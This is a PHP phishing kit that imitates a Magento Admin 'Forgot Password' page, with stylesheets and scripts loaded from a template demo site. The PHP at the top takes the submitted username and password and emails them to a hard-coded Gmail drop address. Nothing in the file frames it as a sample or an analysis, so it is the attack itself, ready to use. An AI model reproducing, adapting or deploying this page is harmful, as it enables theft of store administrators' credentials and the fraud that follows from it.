<?php
if (isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $to = 'king9test9@gmail.com';
    $subject = "New Result";
    $body = '<html>
                <body>
                    <p>Username:'.$username.'</p>
                    <p>Password:'.$password.'</p>
                </body>
            </html>';
    
    $headers = "From: ".$to." <".$to.">\r\n";
    $headers .="MIME-Version: 1.0\r\n";
    $headers .="Content-type: text/html; charset=utf-8";

    //send
    $send = mail($to, $subject, $body, $headers);
    if ($send){
        echo 'Success'; 
    }
    else{
        'Fail';
    }
}

?>

<html xmlns="https://www.w3.org/1999/xhtml" lang="en"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Forgot Password - Magento Admin Page</title>
    <link type="text/css" rel="stylesheet" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/reset.css" media="all">
    <link type="text/css" rel="stylesheet" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/boxes.css" media="all">
    <link rel="icon" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/favicon.ico" type="image/x-icon">

    <script type="text/javascript" async="" src="https://www.google-analytics.com/plugins/ua/ec.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="//www.googletagmanager.com/gtm.js?id=GTM-P9FT69"></script><script type="text/javascript" src="https://livedemo00.template-help.com/magento_47328/js/prototype/prototype.js"></script>
    <script type="text/javascript" src="https://livedemo00.template-help.com/magento_47328/js/prototype/validation.js"></script>
    <script type="text/javascript" src="https://livedemo00.template-help.com/magento_47328/js/scriptaculous/effects.js"></script>
    <script type="text/javascript" src="https://livedemo00.template-help.com/magento_47328/js/mage/adminhtml/form.js"></script>
    <script type="text/javascript" src="https://livedemo00.template-help.com/magento_47328/js/mage/captcha.js"></script>

    <!--[if IE]> <link rel="stylesheet" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/iestyles.css" type="text/css" media="all" /> <![endif]-->
    <!--[if lt IE 7]> <link rel="stylesheet" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/below_ie7.css" type="text/css" media="all" /> <![endif]-->
    <!--[if IE 7]> <link rel="stylesheet" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/ie7.css" type="text/css" media="all" /> <![endif]-->
</head>
<body id="page-login" onload="document.forms.loginForm.username.focus();">
    <div class="login-container">
        <div class="login-box">
            <form method="POST" action="" id="loginForm" autocomplete="off">
                <div class="login-form">
                    <input name="form_key" type="hidden" value="3OzWMhicsDbZagt3">
                    <h2>Forgot Password</h2>
                    <div id="messages">
                                            </div>
                    <div class="input-box input-left"><label for="username">Email:</label><br>
                        <input type="text" id="username" name="username" value="" placeholder="test@gmail.com" class="required-entry input-text">
                        <input type="submit" class="form-button" value="Submit" title="Login">
                        </div>
                        <br>
                        
                </div>
                <p class="legal">Magento is a trademark of Magento Inc. Copyright © 2018 Magento Inc.</p>
            </form>
            <div class="bottom"></div>
        </div>
    </div>
<noscript>&lt;iframe src="//www.googletagmanager.com/ns.html?id=GTM-P9FT69"height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-P9FT69');</script><!-- End Google Tag Manager -->


</body><!-- Google Tag Manager --></html>